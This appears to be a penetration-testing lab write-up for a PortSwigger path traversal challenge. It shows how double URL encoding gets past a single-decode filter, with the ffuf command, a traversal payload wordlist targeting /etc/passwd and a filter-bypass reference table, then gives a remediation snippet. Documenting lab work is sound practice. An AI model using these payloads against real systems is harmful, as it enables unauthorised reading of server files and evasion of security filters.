# Lab 4: File Path Traversal — Traversal Sequences Stripped with Superfluous URL Decode

## Executive Summary

This lab demonstrates exploitation of a file path traversal vulnerability where the application strips traversal sequences after performing URL decoding on the input — but before a second round of decoding that occurs at a deeper layer of the request processing stack. The filter decodes the input once, strips any `../` sequences it finds, and passes the result forward. However, if the traversal sequences are double URL-encoded, the filter decodes them to a single-encoded form that it does not recognize as `../`, passes them through, and the next processing layer decodes them to the final `../` that reaches the filesystem read operation. Rather than using Burp Repeater for manual payload iteration, this lab was approached using ffuf — a command-line fuzzing tool — with a prepared path traversal wordlist to systematically identify the working double-encoded payload. The successful payload `%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd` was identified through fuzzing, confirmed in Burp Repeater, and returned the complete contents of `/etc/passwd`, demonstrating arbitrary filesystem read via double URL encoding bypass.

## Lab Details

| Attribute              | Value |
|------------------------|-------|
| **Source**             | PortSwigger Web Security Academy |
| **Topic**              | Path Traversal |
| **Difficulty**         | Practitioner |
| **Vulnerability**      | File Path Traversal — URL Decode Filter Bypassed via Double URL Encoding |
| **Risk**               | Critical - Arbitrary Filesystem Read via Superfluous Decode Bypass |
| **Completion**         | May 23, 2026 |

## Objective

Exploit a file path traversal vulnerability in the product image `filename` parameter where the application strips traversal sequences after a single URL decode pass. Bypass the filter by double URL-encoding the traversal sequences so that the filter's decode pass produces a single-encoded form it does not recognize, while a subsequent decode layer restores the final traversal sequence that reaches the filesystem read operation. Identify the working payload using ffuf fuzzing against a prepared path traversal wordlist, confirm in Burp Repeater, and read `/etc/passwd`.

## Testing Setup

**Tools Used:**
- Burp Suite Professional (Licensed to Gurpreet Singh)
- Burp Proxy for traffic interception and request capture
- Burp Repeater for baseline testing and payload confirmation
- ffuf (command-line web fuzzer) for systematic payload enumeration against a path traversal wordlist
- nano (text editor) for preparing the ffuf request template and payload list

**Target:** `filename` query parameter in the product image serving endpoint — URL decoding applied before traversal sequence stripping, creating a superfluous decode bypass opportunity when payloads are double-encoded

**Tooling Decision — Why ffuf:**
This lab introduces automated fuzzing as a methodology alongside manual Burp Repeater testing. When a filter's exact behavior is unknown and multiple encoding variants are plausible, fuzzing a comprehensive path traversal wordlist against the target is more efficient than manually iterating encoding combinations in Repeater. ffuf allows a full wordlist to be tested in seconds, with results filtered by HTTP status code to immediately identify working payloads.

## Exploitation Walkthrough

### 1. Initial Reconnaissance

Accessed the lab environment confirming the challenge title "File path traversal, traversal sequences stripped with superfluous URL decode" with Burp Suite Professional configured and actively intercepting traffic, with a captured request visible in the Proxy Intercept panel.

<img width="1920" height="982" alt="LAB4_ss1" src="https://github.com/user-attachments/assets/a157ac73-ed7f-4e61-89a5-d4ecb0547eaf" />

*Lab 4 Path Traversal environment displaying the superfluous URL decode challenge title (right) | Burp Suite Professional licensed to Gurpreet Singh, configured with intercepted request visible in Proxy Intercept panel (left)*

### 2. Attack Surface Identification and Baseline Testing

Browsed the shop product pages to populate HTTP history. Identified the product image loading request carrying `filename=13.jpg` as the injection surface. Forwarded the request to Burp Repeater and sent it unmodified to confirm the baseline behavior.

<img width="1920" height="983" alt="LAB4_ss2" src="https://github.com/user-attachments/assets/a19fc26c-776d-44ed-9a26-e85d865aa77f" />

*Image request with `filename=13.jpg` sent in Repeater — 200 OK response with raw image binary data and Adobe Photoshop metadata visible, confirming the server reads and returns raw file contents directly from disk. Injection surface confirmed*

**Request Captured:**
```http
GET /image?filename=13.jpg HTTP/1.1
Host: [lab-id].web-security-academy.net
```

**Response:** 200 OK — raw image binary data with Adobe Photoshop metadata present.

**Analysis:** Consistent baseline with all preceding path traversal labs. The server reads the file specified by `filename` from a base directory and returns raw contents without transformation. The Photoshop metadata in the response confirms direct filesystem reads. Standard traversal and absolute path bypasses from Labs 2 and 3 are expected to fail given the challenge title — fuzzing is the appropriate approach to identify the working encoding variant.

### 3. ffuf Request Template Preparation

Rather than iterating encoding variants manually in Repeater, the approach here is to prepare a complete HTTP request template for ffuf and fuzz the `filename` parameter against a path traversal payload wordlist. This requires two files: a request template with the fuzzing position marked, and a payload list containing candidate traversal sequences.

Copied the raw HTTP request from Burp Repeater and pasted it into a new file on the desktop using nano:

```bash
nano ~/Desktop/pathtraversal.txt
```

Edited the `filename` parameter value, replacing `13.jpg` with the ffuf fuzzing marker `FUZZ`:

```http
GET /image?filename=FUZZ HTTP/1.1
Host: [lab-id].web-security-academy.net
Cookie: session=[SESSION_VALUE]
```

Saved the file with Ctrl+X → Y → Enter.

<img width="1920" height="983" alt="LAB4_ss3" src="https://github.com/user-attachments/assets/b823f8c2-7f52-497e-96a8-ff8ddbe5100e" />

*Request template `pathtraversal.txt` created in nano — full HTTP request pasted from Repeater with `filename` parameter value replaced by `FUZZ` marker, ready for ffuf to substitute payload wordlist entries at that position*

**Template File Contents:**
```
GET /image?filename=FUZZ HTTP/1.1
Host: [lab-id].web-security-academy.net
Cookie: session=[SESSION_VALUE]
```

**FUZZ Placement:** The `FUZZ` keyword is placed exactly at the `filename` parameter value position. ffuf replaces this marker with each entry from the payload wordlist on every request iteration.

### 4. Payload Wordlist Preparation and Pre-Flight Verification

Created a payload wordlist file on the desktop containing path traversal sequences across multiple encoding variants — standard traversal, URL-encoded, double URL-encoded, nested, and combination forms:

```bash
nano ~/Desktop/payload.txt
```

**payload.txt contents (representative entries):**
```
../../../etc/passwd
..%2f..%2f..%2fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
....//....//....//etc/passwd
/etc/passwd
%2fetc%2fpasswd
..%252f..%252f..%252fetc/passwd
[additional variants...]
```

After saving `payload.txt`, verified `pathtraversal.txt` to confirm the `FUZZ` marker was correctly positioned at the `filename` parameter before launching the fuzzer.


<img width="1920" height="983" alt="LAB4_ss4" src="https://github.com/user-attachments/assets/ee3c70b3-90fe-4441-99a5-aa84f05a4932" />

*`payload.txt` created on desktop containing path traversal payload variants across multiple encoding forms (left) | `pathtraversal.txt` verified — `FUZZ` marker confirmed at correct position in `filename` parameter (right). Both files ready for ffuf execution*

### 5. ffuf Fuzzing Execution — Working Payload Identified

Launched ffuf with the prepared request template and payload wordlist, targeting the lab over HTTPS:

**ffuf Command:**
```bash
ffuf -request ~/Desktop/pathtraversal.txt -request-proto https -w ~/Desktop/payload.txt
```

**Command Breakdown:**

| Flag | Value | Purpose |
|------|-------|---------|
| `-request` | `~/Desktop/pathtraversal.txt` | Full HTTP request template with FUZZ marker |
| `-request-proto` | `https` | Specifies HTTPS as the request protocol |
| `-w` | `~/Desktop/payload.txt` | Payload wordlist — each entry substituted at FUZZ position |

ffuf iterates through every entry in `payload.txt`, substitutes it at the `FUZZ` position in the request template, sends the request to the target, and records the HTTP status code, response size, and response time for each attempt.

<img width="1920" height="983" alt="LAB4_ss5" src="https://github.com/user-attachments/assets/e5c23110-ed61-4a53-bf56-6deedfb5b067" />


*ffuf fuzzing output — multiple results showing 200 OK status for the double URL-encoded payload `%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd`. All other payload variants returned non-200 responses. Working payload identified — fuzzer stopped with Ctrl+C and payload copied for Repeater confirmation*

**ffuf Results:**

The fuzzer returned 200 OK for the double URL-encoded traversal payload:

```
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd   [Status: 200]
```

All other variants — standard traversal, single URL-encoded, nested, absolute path — returned 400 Bad Request or other non-200 responses, confirming the filter blocks them. The double URL-encoded form was the sole successful payload.

**Stopped fuzzer with Ctrl+C. Copied the working payload for confirmation in Burp Repeater.**

**Why Double URL Encoding Works — Decode Layer Analysis:**

The filter applies URL decoding to the input before scanning for traversal sequences. Double URL encoding exploits a second decode operation that occurs after the filter has already run:

```
Double-encoded input:   %252e%252e%252f

Layer 1 — Filter decodes once:
  %25 → %   (percent sign)
  %252e → %2e  (not yet a dot — still encoded)
  %252f → %2f  (not yet a slash — still encoded)
  Result after filter decode: %2e%2e%2f

Filter scans for ../ :
  Sees %2e%2e%2f — does NOT match ../
  Filter passes the request — no traversal pattern detected

Layer 2 — Application/server decodes again:
  %2e → .
  %2e → .
  %2f → /
  Final result: ../    ← traversal sequence restored
```

The filter sees `%2e%2e%2f` after its single decode pass — a percent-encoded string, not a traversal sequence. It does not match the `../` pattern the filter is checking for and is passed through. The second decode layer, which occurs as part of normal URL processing deeper in the request handling stack, converts `%2e%2e%2f` to `../`, which then reaches the filesystem read operation as a live traversal sequence.

**Encoding Anatomy:**

| Encoding Stage | `.` character | `/` character | Full sequence |
|----------------|--------------|--------------|---------------|
| Plaintext | `.` | `/` | `../` |
| Single URL-encoded | `%2e` | `%2f` | `%2e%2e%2f` |
| Double URL-encoded (used) | `%252e` | `%252f` | `%252e%252e%252f` |

`%25` is the URL encoding of the `%` character itself. So `%252e` is `%` + `2e` — when decoded once, `%25` becomes `%` and produces `%2e`. When decoded a second time, `%2e` becomes `.`.

### 6. Payload Confirmed in Burp Repeater

**Step 6.1 — Traversal Confirmed, Credentials Exposed**

Returned to Burp Repeater with the working payload identified by ffuf. Set the `filename` parameter value to the double URL-encoded traversal sequence and sent the request.

**Attack Payload:**
```http
GET /image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd HTTP/1.1
Host: [lab-id].web-security-academy.net
```

**Decoded Path Resolution:**
```
Filter decode:   %252e%252e%252f → %2e%2e%2f  (passes filter)
Server decode:   %2e%2e%2f → ../              (traversal restored)

Full path:       /var/www/images/../../../etc/passwd
Resolved:        /etc/passwd
```

<img width="1920" height="983" alt="LAB4_ss6 1" src="https://github.com/user-attachments/assets/fe8ae608-10d5-42dc-827d-d31c0bf4ffee" />


*Double URL-encoded payload `%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd` submitted in Repeater — 200 OK response returns the complete contents of `/etc/passwd` including root, daemon, bin, sys, and all configured system account entries. Double URL encoding bypass confirmed*

**Response:** 200 OK — complete contents of `/etc/passwd` returned.

**Response Contents Included:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
[all remaining account entries...]
```

**Step 6.2 — Lab Objective Achieved**


<img width="1920" height="983" alt="LAB4_ss6 2" src="https://github.com/user-attachments/assets/b71a1532-f283-47d5-8df1-59acb0e17832" />

*Repeater response panel showing complete `/etc/passwd` contents with all system account credentials exposed (left) | Lab completion confirmation — "Congratulations, you solved the lab!" visible in the browser (right)*

**Lab completion confirmed: "Congratulations, you solved the lab!"**

## Technical Impact

**Severity: Critical (CVSS 9.1)**

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
```

**Primary Vulnerabilities:**

**CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)**
- `filename` parameter value reaches the filesystem read operation after incomplete sanitization
- Filter operates on singly-decoded input, leaving doubly-encoded traversal sequences undetected
- Resolved path escapes the intended base directory after the second decode pass restores the traversal sequence

**CWE-116: Improper Encoding or Escaping of Output — Decode Order Vulnerability**
- Security control (filter) and functional code (file read) operate on different representations of the same input
- Filter sees singly-decoded form; file read operation sees doubly-decoded form
- The decode ordering mismatch is the exploitable gap — the filter and the filesystem operation do not agree on what the input value is

**Complete Attack Chain:**

```
Image Filename Parameter Identified as Injection Surface
        ↓
Baseline Confirms Raw File Contents Served from Disk
        ↓
Standard and Previously Known Bypasses Expected to Fail
        ↓
ffuf Request Template Prepared (pathtraversal.txt with FUZZ marker)
        ↓
Path Traversal Payload Wordlist Prepared (payload.txt with encoding variants)
        ↓
ffuf Executed: -request pathtraversal.txt -request-proto https -w payload.txt
        ↓
200 OK Identified for %252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
        ↓
Filter Decodes %252e → %2e — Does Not Match ../ — Passes Request
        ↓
Server Decodes %2e → . — Traversal Sequence Restored as ../
        ↓
/etc/passwd Resolved and Read — Complete Contents Returned
        ↓
Payload Confirmed in Repeater — Lab Solved
```

**Superfluous Decode — Why the Vulnerability Exists:**

Web application stacks commonly involve multiple layers of URL decoding. A request may pass through:

1. A WAF or input filter that decodes once to inspect the payload
2. A web framework that decodes the query string parameters for the application
3. The application itself performing additional decoding

When a security control decodes and inspects at layer 1, but the data continues decoding through layers 2 and 3 before reaching the sensitive operation, any encoding that survives the layer 1 inspection intact will be decoded into its functional form by the time it reaches the target. The security control and the sensitive operation are not inspecting the same representation of the input.

This is the same architectural flaw that enables filter bypasses in XSS (double-encoded `<script>` tags bypassing WAF inspection) and SQL injection (double-encoded quotes bypassing input validation). The pattern is consistent across vulnerability classes: security controls that operate on encoded input without normalizing to a canonical form first are vulnerable to encoding attacks.

**Fuzzing as a Methodology for Encoding-Based Bypasses:**

Manual testing of encoding variants in Burp Repeater is feasible but slow when the number of plausible variants is large. For a parameter where the filter behavior is unknown, the combination of:

- Standard traversal
- Single URL encoding
- Double URL encoding  
- Mixed encoding (some components encoded, others not)
- Unicode variants
- Null byte variants
- OS separator variants

...produces dozens of candidate payloads. Fuzzing with a comprehensive wordlist against a target and filtering results by 200 OK is significantly more efficient. The ffuf workflow used here — request template with FUZZ marker, payload wordlist, HTTPS protocol specification — is a transferable methodology applicable to any parameter where encoding-based filter bypass is suspected.

**Path Traversal Encoding Bypass Reference:**

| Payload Variant | Encoding Applied | Bypasses Filter Type |
|-----------------|-----------------|----------------------|
| `../../../etc/passwd` | None | No filter |
| `/etc/passwd` | None | `../` blocked only |
| `....//....//etc/passwd` | None | Non-recursive strip |
| `%2e%2e%2f%2e%2e%2fetc/passwd` | Single URL | Filters checking raw input |
| **`%252e%252e%252f` (this lab)** | **Double URL** | **Single-pass URL decode filter** |
| `%c0%ae%c0%ae%c0%afetc/passwd` | Overlong UTF-8 | Filters not normalizing Unicode |
| `..%00/etc/passwd` | Null byte | Extension-checking filters |

**Real-World Context:**

Double URL encoding bypasses are encountered most frequently against WAFs, reverse proxies, and middleware that perform security inspection before forwarding requests to the application server. The WAF decodes once for inspection; the application server decodes again for processing. Any input that survives WAF inspection in singly-encoded form reaches the application server in its decoded, functional form. This is a known and well-documented class of WAF bypass applicable far beyond path traversal.

## Key Takeaways

**Penetration Testing Methodology Applied:**
- Automated fuzzing as the primary discovery method when multiple encoding variants are plausible
- ffuf request template preparation: copy raw HTTP request from Burp, replace injection point with FUZZ, specify HTTPS protocol
- Payload wordlist covering encoding variants systematically rather than guessing manually
- Result filtering by HTTP status code to isolate successful payloads from a large result set
- Repeater confirmation of fuzzer findings before reporting — fuzzer identifies the candidate, Repeater provides clean documentation

**Critical Security Insights:**

**1. Security Controls Must Operate on Fully Normalized Input:**
A filter that decodes input once before inspection, while the application decodes it twice before use, is inspecting a different value than the one that reaches the sensitive operation. The correct approach is to normalize the input to its fully decoded canonical form before any security inspection occurs, ensuring the filter and the application agree on what the input value is.

**2. Double URL Encoding Is a Standard WAF and Filter Bypass Technique:**
This technique is not novel or sophisticated — it is a well-known and widely documented bypass applicable against any security control that performs a single decode pass before inspection. Path traversal wordlists used in professional assessments routinely include double-encoded variants. A filter that does not account for double encoding provides only superficial protection.

**3. Fuzzing Is the Correct Tool for Unknown Filter Behavior:**
When filter behavior is unknown and multiple encoding variants are plausible, manual iteration is inefficient and incomplete. A path traversal wordlist covering standard, encoded, double-encoded, nested, and Unicode variants contains dozens of entries. Fuzzing with ffuf identifies the working payload in seconds; manual Repeater testing of the same wordlist takes considerably longer with higher risk of missing entries.

**4. The ffuf Request Template Workflow Is Directly Applicable to Other Parameters:**
The methodology used here — copy raw HTTP request, mark injection point with FUZZ, prepare a targeted wordlist, specify the protocol — applies to any parameter where fuzzing is appropriate. The same workflow supports SQL injection wordlists, XSS payload lists, authentication bypass attempts, and directory enumeration. Learning this workflow in a path traversal context transfers directly to other assessment scenarios.

**5. Canonical Fix Remains Identical Across All Four Labs:**

```python
import os

base_dir = "/var/www/images/"
user_input = request.GET["filename"]

# Fully decode before any processing — eliminate encoding as an attack vector
import urllib.parse
decoded_input = urllib.parse.unquote(urllib.parse.unquote(user_input))

# Canonicalize the decoded input — resolve all path manipulation
canonical = os.path.realpath(os.path.join(base_dir, decoded_input))

# Validate against the resolved, canonical path
if not canonical.startswith(os.path.realpath(base_dir) + os.sep):
    return 400

return open(canonical, "rb").read()
```

Alternatively — and more robustly — use an indirect file reference mapping that eliminates user-controlled path construction entirely. No encoding variant can bypass a system where the user-supplied value never participates in filesystem path construction.

## References

1. PortSwigger Web Security Academy - Path Traversal
2. PortSwigger Web Security Academy - Bypassing Path Traversal Defenses
3. OWASP Top 10 (2021) - A01: Broken Access Control
4. CWE-22 - Improper Limitation of a Pathname to a Restricted Directory
5. CWE-116 - Improper Encoding or Escaping of Output
6. ffuf Documentation - Web Fuzzer Tool
7. OWASP Double Encoding Attack Reference
8. OWASP Path Traversal Attack Reference

---

## Legal Notice

**Copyright © 2026 Gurpreet Singh**
Licensed under CC BY-NC-ND 4.0

**Repository:** https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs

**Disclaimer:** This documentation is for authorized security testing and educational purposes only. All techniques were performed in a controlled laboratory environment with explicit permission. Unauthorized access to server filesystems, filter bypass attempts, or exploitation of path traversal vulnerabilities against systems without explicit written authorization is illegal under applicable laws worldwide.
